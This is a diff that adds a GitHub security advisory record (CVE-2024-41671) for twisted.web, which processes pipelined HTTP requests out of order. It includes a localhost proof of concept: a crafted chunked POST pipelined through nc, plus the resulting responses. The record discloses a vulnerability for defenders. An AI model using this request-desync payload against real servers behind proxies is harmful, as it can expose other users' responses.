@@ -1,0 +1,76 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-c8m8-j448-xjx7",
+  "modified": "2024-07-29T16:33:11Z",
+  "published": "2024-07-29T16:33:11Z",
+  "aliases": [
+    "CVE-2024-41671"
+  ],
+  "summary": "twisted.web has disordered HTTP pipeline response",
+  "details": "### Summary\n\nThe HTTP 1.0 and 1.1 server provided by twisted.web could process pipelined HTTP requests out-of-order, possibly resulting in information disclosure.\n\n### PoC\n0. Start a fresh Debian container:\n```sh\ndocker run --workdir /repro --rm -it debian:bookworm-slim\n```\n1. Install twisted and its dependencies:\n```sh\napt -y update && apt -y install ncat git python3 python3-pip \\\n    && git clone --recurse-submodules https://github.com/twisted/twisted \\\n    && cd twisted \\\n    && pip3 install --break-system-packages .\n```\n2. Run a twisted.web HTTP server that echos received requests' methods. e.g., the following:\n```python\nfrom twisted.web import server, resource\nfrom twisted.internet import reactor\n\nclass TheResource(resource.Resource):\n    isLeaf = True\n\n    def render_GET(self, request) -> bytes:\n        return b\"GET\"\n\n    def render_POST(self, request) -> bytes:\n        return b\"POST\"\n\nsite = server.Site(TheResource())\nreactor.listenTCP(80, site)\nreactor.run()\n```\n3. Send it a POST request with a chunked message body, pipelined with another POST request, wait a second, then send a GET request on the same connection:\n```sh\n(printf 'POST / HTTP/1.1\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nContent-Length: 0\\r\\n\\r\\n'; sleep 1; printf 'GET / HTTP/1.1\\r\\n\\r\\n'; sleep 1) | nc localhost 80\n```\n4. Observe that the responses arrive out of order:\n```\nHTTP/1.1 200 OK\nServer: TwistedWeb/24.3.0.post0\nDate: Tue, 09 Jul 2024 06:19:41 GMT\nContent-Length: 5\nContent-Type: text/html\n\nPOST\nHTTP/1.1 200 OK\nServer: TwistedWeb/24.3.0.post0\nDate: Tue, 09 Jul 2024 06:19:42 GMT\nContent-Length: 4\nContent-Type: text/html\n\nGET\nHTTP/1.1 200 OK\nServer: TwistedWeb/24.3.0.post0\nDate: Tue, 09 Jul 2024 06:19:42 GMT\nContent-Length: 5\nContent-Type: text/html\n\nPOST\n```\n\n### Impact\nSee [GHSA-xc8x-vp79-p3wm](https://github.com/twisted/twisted/security/advisories/GHSA-xc8x-vp79-p3wm). Further, for instances of twisted.web HTTP servers deployed behind reverse proxies that implement connection pooling, it may be possible for remote attackers to receive responses intended for other clients of the twisted.web server.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "twisted"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "24.7.0rc1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 24.3.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/security/advisories/GHSA-c8m8-j448-xjx7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-41671"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/commit/046a164f89a0f08d3239ecebd750360f8914df33"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/twisted/twisted/commit/4a930de12fb67e88fefcb8822104152f42b27abc"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/twisted/twisted"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-444"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-07-29T16:33:11Z",
+    "nvd_published_at": "2024-07-29T15:15:15Z"
+  }
+}
